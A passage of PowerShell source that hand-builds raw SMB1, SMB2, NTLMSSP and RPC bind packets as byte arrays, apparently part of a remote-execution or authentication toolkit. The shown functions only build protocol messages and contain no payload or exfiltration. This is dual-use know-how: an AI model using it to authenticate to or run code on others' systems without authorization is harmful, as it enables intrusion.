        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxBuffer",[Byte[]](0xff,0xff))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxMpxCount",[Byte[]](0x02,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_VCNumber",[Byte[]](0x01,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlobLength",$packet_byte_count)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_ByteCount",$packet_security_blob_length)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlob",$packet_security_blob)
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeOS",[Byte[]](0x00,0x00,0x00))
        $packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeLANManage",[Byte[]](0x00,0x00))

        return $packet_SMBSessionSetupAndXRequest 
    }

    function Get-PacketSMBTreeConnectAndXRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_WordCount",[Byte[]](0x04))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_PasswordLength",[Byte[]](0x01,0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_ByteCount",$packet_path_length)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Password",[Byte[]](0x00))
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Tree",$packet_path)
        $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

        return $packet_SMBTreeConnectAndXRequest
    }

    function Get-PacketSMBNTCreateAndXRequest()
    {
        param([Byte[]]$packet_named_pipe)

        [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]
        [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)
        $packet_file_name_length = $packet_file_name_length[0,1]

        $packet_SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_WordCount",[Byte[]](0x18))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved2",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileNameLen",$packet_file_name_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_RootFID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Disposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_SecurityFlags",[Byte[]](0x00))
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ByteCount",$packet_named_pipe_length)
        $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Filename",$packet_named_pipe)

        return $packet_SMBNTCreateAndXRequest
    }

    function Get-PacketSMBReadAndXRequest()
    {
        $packet_SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_WordCount",[Byte[]](0x0a))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_FID",[Byte[]](0x00,0x40))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MaxCountLow",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MinCount",[Byte[]](0x58,0x02))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Unknown",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Remaining",[Byte[]](0x00,0x00))
        $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBReadAndXRequest
    }

    function Get-PacketSMBWriteAndXRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)
        $packet_write_length = $packet_write_length[0,1]

        $packet_SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WordCount",[Byte[]](0x0e))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_FID",$packet_file_ID)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Offset",[Byte[]](0xea,0x03,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WriteMode",[Byte[]](0x08,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Remaining",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthHigh",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthLow",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataOffset",[Byte[]](0x3f,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_ByteCount",$packet_write_length)

        return $packet_SMBWriteAndXRequest
    }

    function Get-PacketSMBCloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBCloseRequest.Add("SMBCloseRequest_WordCount",[Byte[]](0x03))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_FID",$packet_file_ID)
        $packet_SMBCloseRequest.Add("SMBCloseRequest_LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBCloseRequest
    }

    function Get-PacketSMBTreeDisconnectRequest()
    {
        $packet_SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_WordCount",[Byte[]](0x00))
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBTreeDisconnectRequest
    }

    function Get-PacketSMBLogoffAndXRequest()
    {
        $packet_SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_WordCount",[Byte[]](0x02))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBLogoffAndXRequest
    }

    #SMB2

    function Get-PacketSMB2Header()
    {
        param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

        [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

        $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2Header.Add("SMB2Header_ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
        $packet_SMB2Header.Add("SMB2Header_StructureSize",[Byte[]](0x40,0x00))
        $packet_SMB2Header.Add("SMB2Header_CreditCharge",[Byte[]](0x01,0x00))
        $packet_SMB2Header.Add("SMB2Header_ChannelSequence",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Command",$packet_command)
        $packet_SMB2Header.Add("SMB2Header_CreditRequest",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Flags",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_MessageID",$packet_message_ID)
        $packet_SMB2Header.Add("SMB2Header_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_TreeID",$packet_tree_ID)
        $packet_SMB2Header.Add("SMB2Header_SessionID",$packet_session_ID)
        $packet_SMB2Header.Add("SMB2Header_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SMB2Header
    }

    function Get-PacketSMB2NegotiateProtocolRequest()
    {
        $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_StructureSize",[Byte[]](0x24,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_DialectCount",[Byte[]](0x02,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_SecurityMode",[Byte[]](0x01,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect",[Byte[]](0x02,0x02))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect2",[Byte[]](0x10,0x02))

        return $packet_SMB2NegotiateProtocolRequest
    }

    function Get-PacketSMB2SessionSetupRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_StructureSize",[Byte[]](0x19,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Flags",[Byte[]](0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityMode",[Byte[]](0x01))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferOffset",[Byte[]](0x58,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferLength",$packet_security_blob_length)
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Buffer",$packet_security_blob)

        return $packet_SMB2SessionSetupRequest 
    }

    function Get-PacketSMB2TreeConnectRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_StructureSize",[Byte[]](0x09,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathOffset",[Byte[]](0x48,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathLength",$packet_path_length)
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Buffer",$packet_path)

        return $packet_SMB2TreeConnectRequest
    }

    function Get-PacketSMB2CreateRequestFile()
    {
        param([Byte[]]$packet_named_pipe)

        $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]

        $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_StructureSize",[Byte[]](0x39,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Flags",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_RequestedOplockLevel",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameOffset",[Byte[]](0x78,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameLength",$packet_named_pipe_length)
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Buffer",$packet_named_pipe)

        return $packet_SMB2CreateRequestFile
    }

    function Get-PacketSMB2ReadRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Padding",[Byte[]](0x50))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Flags",[Byte[]](0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Length",[Byte[]](0x00,0x00,0x10,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_FileID",$packet_file_ID)
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Buffer",[Byte[]](0x30))

        return $packet_SMB2ReadRequest
    }

    function Get-PacketSMB2WriteRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

        $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_DataOffset",[Byte[]](0x70,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Length",$packet_write_length)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_FileID",$packet_file_ID)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Flags",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SMB2WriteRequest
    }

    function Get-PacketSMB2CloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_StructureSize",[Byte[]](0x18,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_FileID",$packet_file_ID)

        return $packet_SMB2CloseRequest
    }

    function Get-PacketSMB2TreeDisconnectRequest()
    {
        $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2TreeDisconnectRequest
    }

    function Get-PacketSMB2SessionLogoffRequest()
    {
        $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2SessionLogoffRequest
    }

    #NTLM

    function Get-PacketNTLMSSPNegotiate()
    {
        param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
        [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
        [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
        [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
        [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

        $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialContextTokenID",[Byte[]](0x60)) # the ASN.1 key names are likely not all correct
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialcontextTokenLength",$packet_ASN_length_1)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechID",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechLength",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength",$packet_ASN_length_2)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength2",$packet_ASN_length_3)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength",[Byte[]](0x0e))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength2",[Byte[]](0x0c))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID3",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength3",[Byte[]](0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenID",[Byte[]](0xa2))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenLength",$packet_ASN_length_4)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPID",[Byte[]](0x04))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NegotiateFlags",$packet_negotiate_flags)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($packet_version)
        {
            $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Version",$packet_version)
        }

        return $packet_NTLMSSPNegotiate
    }

    function Get-PacketNTLMSSPAuth()
    {
        param([Byte[]]$packet_NTLM_response)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
        [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
        $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
        [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
        $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
        [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
        $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

        $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID",[Byte[]](0xa1,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength",$packet_ASN_length_1)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID2",[Byte[]](0x30,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength2",$packet_ASN_length_2)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID3",[Byte[]](0xa2,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength3",$packet_ASN_length_3)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPID",[Byte[]](0x04,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMResponse",$packet_NTLM_response)

        return $packet_NTLMSSPAuth
    }

    #RPC

    function Get-PacketRPCBind()
    {
        param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

        [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

